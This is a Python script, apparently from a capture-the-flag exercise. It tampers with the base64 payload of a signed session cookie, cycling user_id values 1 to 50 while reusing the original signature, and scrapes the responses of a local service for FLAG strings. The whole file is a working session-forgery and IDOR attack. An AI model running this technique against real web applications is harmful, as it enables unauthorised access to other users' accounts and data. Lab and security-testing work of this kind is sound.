import requests
import base64
import json
import re

# Original cookie components
cookie_template = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfKCw.jl3AMMmNnBqRtf0OTxwr0Uo3aeg"
parts = cookie_template.split('.')
_, timestamp, signature = parts

print("[*] Comprehensive IDOR Test - Extracting user data for each ID\n")

# Test IDs sequentially from 1-100 since we have no signature validation
found_flags = []
interesting_responses = []

# Let's also check what response we got for user_id=10032 (original)
original_payload = {"user_id": 10032}
original_str = json.dumps(original_payload, separators=(',', ':'))
original_b64 = base64.urlsafe_b64encode(original_str.encode()).decode().rstrip('=')
original_cookie = f"{original_b64}.{timestamp}.{signature}"
headers_orig = {'Cookie': f'session={original_cookie}'}
orig_resp = requests.get('http://127.0.0.1:33198/', headers=headers_orig, timeout=5)
print(f"[ORIGINAL] user_id=10032 | Length: {len(orig_resp.text)}B")
print(f"HTML snippet: {orig_resp.text[:300]}...")
print()

# Now test sequential IDs to find hidden data
for user_id in range(1, 51):
    payload = {"user_id": user_id}
    payload_str = json.dumps(payload, separators=(',', ':'))
    payload_b64 = base64.urlsafe_b64encode(payload_str.encode()).decode().rstrip('=')
    tampered_cookie = f"{payload_b64}.{timestamp}.{signature}"
    
    headers = {'Cookie': f'session={tampered_cookie}'}
    response = requests.get('http://127.0.0.1:33198/', headers=headers, timeout=5)
    
    # Search for flags
    flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
    if flag_matches:
        print(f"[!] FLAG FOUND at user_id={user_id}:")
        for flag in flag_matches:
            print(f"    {flag}")
            found_flags.append({"user_id": user_id, "flag": flag})
    
    # Check if response differs from original
    if len(response.text) != len(orig_resp.text) or response.text != orig_resp.text:
        interesting_responses.append({
            "user_id": user_id,
            "length": len(response.text),
            "diff": True
        })
        print(f"[ANOMALY] user_id={user_id:>3} | Length: {len(response.text)}B | DIFFERENT from original")
        
        # Show differences
        orig_lines = orig_resp.text.split('\n')
        resp_lines = response.text.split('\n')
        for i, (o, r) in enumerate(zip(orig_lines, resp_lines)):
            if o != r:
                print(f"    Line {i} differs")
                if 'Welcome' in r:
                    print(f"    Content: {r.strip()}")
                break
    else:
        # If same as original, just show the ID
        if user_id % 10 == 0:
            print(f"[*] user_id={user_id:>3} | Length: {len(response.text)}B | Same as original")

print("\n" + "="*60)
print("SUMMARY:")
print(f"Found {len(found_flags)} flags")
print(f"Found {len(interesting_responses)} responses different from original")

if found_flags:
    print("\n[!] ALL FLAGS FOUND:")
    for item in found_flags:
        print(f"  user_id={item['user_id']}: {item['flag']}")
